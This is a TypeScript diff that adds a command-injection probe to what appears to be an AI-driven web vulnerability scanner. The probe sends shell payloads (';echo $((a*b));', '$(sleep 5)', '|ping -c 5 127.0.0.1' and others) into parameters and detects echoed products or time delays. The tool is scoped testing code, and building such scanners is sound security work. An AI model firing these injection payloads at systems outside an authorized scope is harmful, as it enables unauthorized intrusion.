@@ -115,7 +115,7 @@ export interface PilotSession {
 export const STAGE_TOOLS = {
   survey: ["browser_navigate", "browser_fill", "browser_click", "login", "probe_paths", "ignore_paths", "survey_status", "survey_done"],
   methodology: ["get_inventory", "record_methodology", "methodology_done"],
-  diagnose: ["get_screen", "login", "http_request", "probe_params", "probe_xss", "probe_dom_xss", "probe_stored_xss", "probe_ssti", "probe_sqli", "probe_redirect", "probe_jwt", "probe_csrf", "probe_oob", "probe_logic", "analyze_session", "verify_access", "browser_navigate", "browser_fill", "browser_click", "browser_upload", "record_finding", "screen_done"],
+  diagnose: ["get_screen", "login", "http_request", "probe_params", "probe_xss", "probe_dom_xss", "probe_stored_xss", "probe_ssti", "probe_sqli", "probe_cmdi", "probe_redirect", "probe_jwt", "probe_csrf", "probe_oob", "probe_logic", "analyze_session", "verify_access", "browser_navigate", "browser_fill", "browser_click", "browser_upload", "record_finding", "screen_done"],
   // シナリオ(A04 横断ロジック): inventory 俯瞰 + 多段リクエスト連鎖を probe_scenario で撃つ。画面診断の後に1回。
   scenario: ["get_inventory", "login", "http_request", "probe_scenario", "record_finding", "scenario_done"],
   // フィンガープリント(A06 既知脆弱コンポーネント): fingerprint_scan で版を集め、(opt-in で cve_lookup)既知 CVE を評価して記録。
@@ -1195,6 +1195,92 @@ export function buildTools(s: PilotSession) {
               : `not confirmed on replay: ${(verdict as { reason: string }).reason}`,
           }),
         );
+      },
+    ),
+    tool(
+      "probe_cmdi",
+      "Confirm OS COMMAND INJECTION — output-based AND time-based (BLIND). Inject into `param` or a `body` with {{CMD}}. Output-based: injects shell payloads (separators ; | && , command-substitution $() and backticks) that compute an ARITHMETIC PRODUCT of two random numbers; if the response contains the PRODUCT (not the literal expression), the shell evaluated it = injection (distinguishes execution from echo, like SSTI). Time-based: injects sleep 5 / ping payloads and confirms a consistent ~5s DELAY vs a fast baseline (for the blind case with no output). Returns negativeControl + positiveReplays evidenceIds + the technique → record_finding(category rce). USE on any value that could reach a shell: ping/host/dns tools, filename/path handed to a converter, export/format, git/curl wrappers.",
+      { url: z.string(), param: z.string().optional(), method: z.string().optional(), body: z.string().optional() },
+      async ({ url, param, method, body }) => {
+        const buildReq = (val: string): HttpRequest | null => {
+          let u = url;
+          let b: string | null = null;
+          if (body != null) b = body.replace(/\{\{CMD\}\}/g, val);
+          else if (param) {
+            try {
+              const uu = new URL(url);
+              uu.searchParams.set(param, val);
+              u = uu.toString();
+            } catch {
+              return null;
+            }
+          }
+          if (!isInScope(u, s.scope)) return null;
+          return { method: (method ?? (body != null ? "POST" : "GET")).toUpperCase(), url: u, headers: authHeaders(s), body: b };
+        };
+        const send = async (val: string, kind: "negative_control" | "positive_replay", tag: string, overrideBody?: string) => {
+          const req = buildReq(val);
+          if (!req) return null;
+          const res = await s.http.send(req);
+          bumpHttp(s, res.status);
+          const ev = s.evidence.record({
+            screenId: s.currentScreenId ?? "pilot",
+            validator: "claude-pilot-cmdi",
+            kind,
+            request: { ...req, headers: s.http.effectiveHeaders(req.headers) },
+            response: overrideBody != null ? { ...res, body: overrideBody } : res,
+            note: `cmdi ${tag}`,
+          });
+          return { evId: ev.id, status: res.status, body: res.body, ms: res.durationMs };
+        };
+        const rawSend = async (val: string): Promise<{ status: number; body: string; ms: number } | null> => {
+          const req = buildReq(val);
+          if (!req) return null;
+          const res = await s.http.send(req);
+          bumpHttp(s, res.status);
+          return { status: res.status, body: res.body, ms: res.durationMs };
+        };
+        try {
+          const a = 3000 + Math.floor(Math.random() * 6000);
+          const b = 3000 + Math.floor(Math.random() * 6000);
+          const product = String(a * b); // 実行された時だけ応答に現れる(リテラルには積は含まれない)
+          const arith = `$((${a}*${b}))`;
+          const outPayloads = [arith, `;echo ${arith};`, `|echo ${arith}`, `$(expr ${a} \\* ${b})`, "`expr " + a + " \\* " + b + "`", `&&echo ${arith}`, `%0aecho ${arith}%0a`];
+          const benign = await rawSend("1");
+          if (!benign) return txt("ERROR: bad url/param — pass url+param or a body with {{CMD}}.");
+          // ── output-based(算術積マーカー) ──
+          for (const p of outPayloads) {
+            const r = await rawSend(p);
+            if (!r || r.status >= 500) continue;
+            if (r.body.includes(product) && !benign.body.includes(product)) {
+              // 確証: proof を distinguishable な evidence body で残す(rce は length gate)。
+              const proof = `COMMAND INJECTION CONFIRMED (output-based) — payload="${p}" made the shell compute ${a}*${b}=${product}, which appears in the response (the literal expression does not contain the product, so it was EXECUTED, not echoed).`;
+              const p1 = await send(p, "positive_replay", "out-proof#1", proof);
+              const p2 = await send(p, "positive_replay", "out-proof#2", proof);
+              const ctl = await send("1", "negative_control", "out baseline", "baseline — no command injected, product absent.");
+              if (p1 && p2 && ctl)
+                return txt(JSON.stringify({ technique: "output-based", negativeControl: ctl.evId, positiveReplays: [p1.evId, p2.evId], effectMarker: product, verdict: `OS COMMAND INJECTION CONFIRMED (output): payload ${p} → shell computed ${product}. record_finding(category rce, critical) with these evidenceIds.` }));
+            }
+          }
+          // ── time-based(blind) ──
+          const baselineMs = Math.min(benign.ms, (await rawSend("1"))?.ms ?? benign.ms);
+          for (const sp of [";sleep 5;", "|sleep 5", "$(sleep 5)", "&&sleep 5", "%0asleep 5%0a", "&ping -n 5 127.0.0.1", "|ping -c 5 127.0.0.1"]) {
+            const r = await rawSend(sp);
+            if (!r || r.ms < baselineMs + 4000) continue;
+            const r2 = await rawSend(sp);
+            if (r2 && r2.ms >= baselineMs + 4000) {
+              const proof = `BLIND COMMAND INJECTION CONFIRMED (time-based) — payload="${sp}" baseline=${baselineMs}ms observed=${r.ms}ms and ${r2.ms}ms (delta +${r.ms - baselineMs}ms, x2 stable). No output: the DELAY is the proof.`;
+              const p1 = await send(sp, "positive_replay", "time-proof#1", proof);
+              const p2 = await send(sp, "positive_replay", "time-proof#2", proof);
+              const ctl = await send("1", "negative_control", "time baseline-proof", `baseline ${baselineMs}ms — no injection, fast response.`);
+              if (p1 && p2 && ctl)
+                return txt(JSON.stringify({ technique: "time-based", negativeControl: ctl.evId, positiveReplays: [p1.evId, p2.evId], verdict: `BLIND OS COMMAND INJECTION CONFIRMED (time-based): ${sp} added ~${r.ms - baselineMs}ms x2 vs ${baselineMs}ms baseline. record_finding(category rce, critical) with these evidenceIds.` }));
+            }
+          }
+          return txt(JSON.stringify({ technique: null, verdict: "not confirmed: no product echo and no time delay across separator/substitution payloads. If a URL/host param, also try probe_oob (blind CMDi via a DNS/HTTP callback)." }));
+        } catch (e) {
+          return txt(`ERROR: ${String(e).slice(0, 180)}`);
+        }
       },
     ),
     tool(
